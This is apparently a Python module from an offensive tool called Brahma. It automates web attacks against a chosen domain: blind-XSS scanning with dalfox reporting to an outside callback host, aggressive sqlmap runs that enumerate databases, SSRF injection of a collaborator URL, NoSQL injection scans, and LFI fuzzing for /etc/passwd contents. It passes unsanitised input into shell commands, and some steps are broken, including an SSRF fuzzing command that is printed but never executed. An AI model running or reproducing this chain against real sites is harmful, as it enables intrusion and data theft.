import time
import os
import re
from Brahma.core.args import target
from Brahma.core.colors import RED, WHITE, GREEN, CYAN, YELLOW
from Brahma.core.styles import RESET, BRIGHT
from os import path

def xss():
    print(BRIGHT + GREEN + "[*] " + RESET + "XSS will be automated using: gf, gf_patterns, waybackurls, subfinder, dalfox, httpx")
    time.sleep(2)

    print(BRIGHT + GREEN + "[*] " + RESET + "Finding subdomains using subfinder" )
    print(BRIGHT + GREEN + "[*] " + RESET + "Making results directory")
    os.system("mkdir results")
    print(BRIGHT + GREEN + "[*] " + RESET + "Running command: subfinder -d " + target + " | tee results/domains.txt ")
    time.sleep(3)
    
    if re.search('https://', target):
        url = target.replace('https://', '')
    else:
        url = target.replace('http://', '')
    
    os.system("subfinder -d " + url + " | tee results/domains.txt")
    print(BRIGHT + GREEN + "[*] " + RESET + "Finding working domains from results/domains.txt")
    print(BRIGHT + GREEN + "[*] " + RESET + "Running command: cat results/domains.txt | httpx | tee results/urls.alive")
    time.sleep(3)
    os.system("cat results/domains.txt | httpx | tee results/urls.alive")
    print(BRIGHT + GREEN + "[*] " + RESET + "Finding urls using waybackurls")
    print(BRIGHT + GREEN + "[*] " + RESET + "Running command: cat results/urls.alive | waybackurls | tee results/urls.final")
    time.sleep(3)
    os.system("cat results/urls.alive | waybackurls | tee results/urls.final")
    print(BRIGHT + GREEN + "[*] " + RESET + "Finding XSS urls using gf and gf_patterns")
    print(BRIGHT + GREEN + "[*] " + RESET + "Running command: gf xss results/urls.final >> results/urls.xss")
    time.sleep(3)
    os.system("gf xss results/urls.final >> results/urls.xss")
    print(BRIGHT + GREEN + "[*] " + RESET + "Finding XSS using dalfox")
    print(BRIGHT + GREEN + "[*] " + RESET + "Running command: dalfox -b hahwul.xss.ht file results/urls.xss")
    time.sleep(3)
    os.system("dalfox -b hahwul.xss.ht file results/urls.xss")
    print(BRIGHT + YELLOW + "[DONE] " + RESET + "All tasks done!")
    
def sqli():
    print(BRIGHT + GREEN + "[*] " + RESET + "SQLI will be automated using: gf, gf_patterns, waybackurls, subfinder, httpx, sqlmap")
    time.sleep(2)

    print(BRIGHT + GREEN + "[*] " + RESET + "Finding subdomains using subfinder" )
    print(BRIGHT + GREEN + "[*] " + RESET + "Making results directory")
    os.system("mkdir results")
    print(BRIGHT + GREEN + "[*] " + RESET + "Running command: subfinder -d " + target + " | tee results/domains.txt ")
    time.sleep(3)
    
    if re.search('https://', target):
        url = target.replace('https://', '')
    else:
        url = target.replace('http://', '')
    
    os.system("subfinder -d " + url + " | tee results/domains.txt")
    print(BRIGHT + GREEN + "[*] " + RESET + "Finding working domains from results/domains.txt")
    print(BRIGHT + GREEN + "[*] " + RESET + "Running command: cat results/domains.txt | httpx | tee results/urls.alive")
    time.sleep(3)
    os.system("cat results/domains.txt | httpx | tee results/urls.alive")
    print(BRIGHT + GREEN + "[*] " + RESET + "Finding urls using waybackurls")
    print(BRIGHT + GREEN + "[*] " + RESET + "Running command: cat results/urls.alive | waybackurls | tee results/urls.final")
    time.sleep(3)
    os.system("cat results/urls.alive | waybackurls | tee results/urls.final")
    print(BRIGHT + GREEN + "[*] " + RESET + "Finding sqli urls using gf and gf_patterns")
    print(BRIGHT + GREEN + "[*] " + RESET + "Running command: gf sqli results/urls.final >> results/urls.sqli")
    time.sleep(3)
    os.system("gf sqli results/urls.final >> results/urls.sqli")
    print(BRIGHT + GREEN + "[*] " + RESET + "Finding sqli using sqlmap")
    print(BRIGHT + GREEN + "[*] " + RESET + "Running command: sqlmap -m results/urls.sqli --dbs --batch --random-agent --level 5 --risk 3 --tamper=between")
    time.sleep(3)
    os.system("sqlmap -m results/urls.sqli --dbs --batch  --random-agent --level 5 --risk 3 --tamper=between")
    print(BRIGHT + YELLOW + "[DONE] " + RESET + "All tasks done!")

def ssrf():
    print(BRIGHT + GREEN + "[*] " + RESET + "SSRF will be automated using: gf, gf_patterns, waybackurls, subfinder, httpx, qsreplace")
    print(BRIGHT + YELLOW + "[NOTE] " + RESET + "This scan requires your burpcollaborator payload")
    time.sleep(2)

    print(BRIGHT + GREEN + "[*] " + RESET + "Finding subdomains using subfinder" )
    print(BRIGHT + GREEN + "[*] " + RESET + "Making results directory")
    os.system("mkdir results")
    print(BRIGHT + GREEN + "[*] " + RESET + "Running command: subfinder -d " + target + " | tee results/domains.txt ")
    time.sleep(3)
    
    if re.search('https://', target):
        url = target.replace('https://', '')
    else:
        url = target.replace('http://', '')
    
    os.system("subfinder -d " + url + " | tee results/domains.txt")
    print(BRIGHT + GREEN + "[*] " + RESET + "Finding working domains from results/domains.txt")
    print(BRIGHT + GREEN + "[*] " + RESET + "Running command: cat results/domains.txt | httpx | tee results/urls.alive")
    time.sleep(3)
    os.system("cat results/domains.txt | httpx | tee results/urls.alive")
    print(BRIGHT + GREEN + "[*] " + RESET + "Finding urls using waybackurls")
    print(BRIGHT + GREEN + "[*] " + RESET + "Running command: cat results/urls.alive | waybackurls | tee results/urls.final")
    time.sleep(3)
    os.system("cat results/urls.alive | waybackurls | tee results/urls.final")
    print(BRIGHT + GREEN + "[*] " + RESET + "Finding SSRF urls using gf and gf_patterns")
    print(BRIGHT + GREEN + "[*] " + RESET + "Running command: gf ssrf results/urls.final >> results/urls.ssrf")
    time.sleep(3)
    os.system("gf ssrf results/urls.final >> results/urls.ssrf")
    print(BRIGHT + GREEN + "[*] " + RESET + "Finding ssrf using qsreplace, ffuf")
    ssrf_collo = input("[>] Enter your burpcollaborator payload: ")
    print(BRIGHT + GREEN + "[*] " + RESET + "Running command: cat results/urls.ssrf | grep '=' | qsreplace http://" + ssrf_collo + " >> urls.ssrf.replaced")
    time.sleep(3)
    os.system("cat results/urls.ssrf | grep '=' | qsreplace http://" + ssrf_collo + " >> urls.ssrf.replaced")
    print(BRIGHT + GREEN + "[*] " + RESET + "Finding ssrf using ffuf")
    print(BRIGHT + GREEN + "[*] " + RESET + "Running command: ffuf -c -w urls.ssrf.replaced -u FUZZ")
    print(BRIGHT + GREEN + "[*] " + RESET + "Check your burpcollaborator, If there is any execution")
    time.sleep(3)
    print(BRIGHT + YELLOW + "[DONE] " + RESET + "All tasks done!")

def nosqli():
    print(BRIGHT + GREEN + "[*] " + RESET + "NOSQLI will be automated using: gf, gf_patterns, waybackurls, subfinder, httpx, nosqli")
    time.sleep(2)

    print(BRIGHT + GREEN + "[*] " + RESET + "Finding subdomains using subfinder" )
    print(BRIGHT + GREEN + "[*] " + RESET + "Making results directory")
    os.system("mkdir results")
    print(BRIGHT + GREEN + "[*] " + RESET + "Running command: subfinder -d " + target + " | tee results/domains.txt ")
    time.sleep(3)
    
    if re.search('https://', target):
        url = target.replace('https://', '')
    else:
        url = target.replace('http://', '')
    
    os.system("subfinder -d " + url + " | tee results/domains.txt")
    print(BRIGHT + GREEN + "[*] " + RESET + "Finding working domains from results/domains.txt")
    print(BRIGHT + GREEN + "[*] " + RESET + "Running command: cat results/domains.txt | httpx | tee results/urls.alive")
    time.sleep(3)
    os.system("cat results/domains.txt | httpx | tee results/urls.alive")
    print(BRIGHT + GREEN + "[*] " + RESET + "Finding urls using waybackurls")
    print(BRIGHT + GREEN + "[*] " + RESET + "Running command: cat results/urls.alive | waybackurls | tee results/urls.final")
    time.sleep(3)
    os.system("cat results/urls.alive | waybackurls | tee results/urls.final")
    print(BRIGHT + GREEN + "[*] " + RESET + "Finding SQLi urls using gf and gf_patterns")
    print(BRIGHT + GREEN + "[*] " + RESET + "Running command: gf sqli results/urls.final >> results/urls.nosqli")
    time.sleep(3)
    os.system("gf sqli results/urls.final >> results/urls.nosqli")
    print(BRIGHT + GREEN + "[*] " + RESET + "Testing urls.nosqli one by one using for loops")
    time.sleep(3)
    
    with open ('results/urls.nosqli') as wordlist:
        read = wordlist.readlines()
    for line in read:
        os.system("nosqli scan -t " + line)
    
    print(BRIGHT + YELLOW + "[DONE] " + RESET + "All tasks done!")

def lfi():
    word = input('[>] Enter your lfi payloads file: ')
    print('')
    print(BRIGHT + GREEN + '[*] ' + RESET + 'One by one all urls will be tested using ffuf so be patient this could take time.')
    time.sleep(3)
    
    if re.search('https://', target):
        url = target.replace('https://', '')
    else:
        url = target.replace('http://', '')

    os.system('subfinder -d ' + url + '|  waybackurls |gf lfi | qsreplace FUZZ | while read url ; do ffuf -u $url -mr "root:x" -w ' + word + ' ; done')
    print(BRIGHT + YELLOW + "[DONE] " + RESET + "All tasks done!")
def all():
    word = input('[>] Enter your lfi payloads file: ')
    ssrf_collo = input("[>] Enter your burpcollaborator payload: ")
    print(BRIGHT + GREEN + "[*] " + RESET + "Automating : XSS, SQLI, LFI, SSRF, NoSQLI")
    print(BRIGHT + GREEN + "[*] " + RESET + "Finding subdomains using subfinder" )
    print(BRIGHT + GREEN + "[*] " + RESET + "Making results directory")
    os.system("mkdir results")
    print(BRIGHT + GREEN + "[*] " + RESET + "Running command: subfinder -d " + target + " | tee results/domains.txt ")
    time.sleep(3)

    if re.search('https://', target):
        url = target.replace('https://', '')
    else:
        url = target.replace('http://', '')
    
    os.system("subfinder -d " + url + " | tee results/domains.txt")
    print(BRIGHT + GREEN + "[*] " + RESET + "Finding working domains from results/domains.txt")
    print(BRIGHT + GREEN + "[*] " + RESET + "Running command: cat results/domains.txt | httpx | tee results/urls.alive")
    time.sleep(3)
    os.system("cat results/domains.txt | httpx | tee results/urls.alive")
    print(BRIGHT + GREEN + "[*] " + RESET + "Finding urls using waybackurls")
    print(BRIGHT + GREEN + "[*] " + RESET + "Running command: cat results/urls.alive | waybackurls | tee results/urls.final")
    time.sleep(3)
    os.system("cat results/urls.alive | waybackurls | tee results/urls.final")
    print(BRIGHT + GREEN + "[*] " + RESET + "Finding SSRF urls using gf and gf_patterns")
    print(BRIGHT + GREEN + "[*] " + RESET + "Running command: gf ssrf results/urls.final >> results/urls.ssrf")
    time.sleep(3)
    os.system("gf ssrf results/urls.final >> results/urls.ssrf")
    print(BRIGHT + GREEN + "[*] " + RESET + "Finding XSS urls using gf and gf_patterns")
    print(BRIGHT + GREEN + "[*] " + RESET + "Running command: gf xss results/urls.final >> results/urls.xss")
    time.sleep(3)
    os.system("gf xss results/urls.final >> results/urls.xss")
    print(BRIGHT + GREEN + "[*] " + RESET + "Finding sqli urls using gf and gf_patterns")
    print(BRIGHT + GREEN + "[*] " + RESET + "Running command: gf sqli results/urls.final >> results/urls.sqli")
    time.sleep(3)
    os.system("gf sqli results/urls.final >> results/urls.sqli")
    print(BRIGHT + GREEN + "[*] " + RESET + "Finding XSS using dalfox")
    print(BRIGHT + GREEN + "[*] " + RESET + "Running command: dalfox -b hahwul.xss.ht file results/urls.xss")
    time.sleep(3)
    os.system("dalfox -b hahwul.xss.ht file results/urls.xss")
    print(BRIGHT + GREEN + "[*] " + RESET + "Finding sqli using sqlmap")
    print(BRIGHT + GREEN + "[*] " + RESET + "Running command: sqlmap -m results/urls.sqli --dbs --batch --random-agent --level 5 --risk 3 --tamper=between")
    time.sleep(3)
    os.system("sqlmap -m results/urls.sqli --dbs --batch  --random-agent --level 5 --risk 3 --tamper=between")
    print(BRIGHT + GREEN + "[*] " + RESET + "Finding ssrf using qsreplace, ffuf")
    print(BRIGHT + GREEN + "[*] " + RESET + "Running command: cat results/urls.ssrf | grep '=' | qsreplace http://" + ssrf_collo + " >> urls.ssrf.replaced")
    time.sleep(3)
    os.system("cat results/urls.ssrf | grep '=' | qsreplace http://" + ssrf_collo + " >> urls.ssrf.replaced")
    print(BRIGHT + GREEN + "[*] " + RESET + "Finding ssrf using ffuf")
    print(BRIGHT + GREEN + "[*] " + RESET + "Running command: ffuf -c -w urls.ssrf.replaced -u FUZZ")
    print(BRIGHT + GREEN + "[*] " + RESET + "Check your burpcollaborator, If there is any execution")
    time.sleep(3)
    print(BRIGHT + GREEN + "[*] " + RESET + "Testing urls.nosqli one by one using for loops")
    time.sleep(3)
    
    with open ('results/urls.nosqli') as wordlist:
        read = wordlist.readlines()
    for line in read:
        os.system("nosqli scan -t " + line)
    print(BRIGHT + GREEN + '[*] ' + RESET + 'One by one all urls will be tested using ffuf so be patient this could take time.')
    os.system('subfinder -d ' + url + '|  waybackurls |gf lfi | qsreplace FUZZ | while read url ; do ffuf -u $url -mr "root:x" -w ' + word + ' ; done')    
    print(BRIGHT + YELLOW + "[DONE] " + RESET + "All tasks done!")




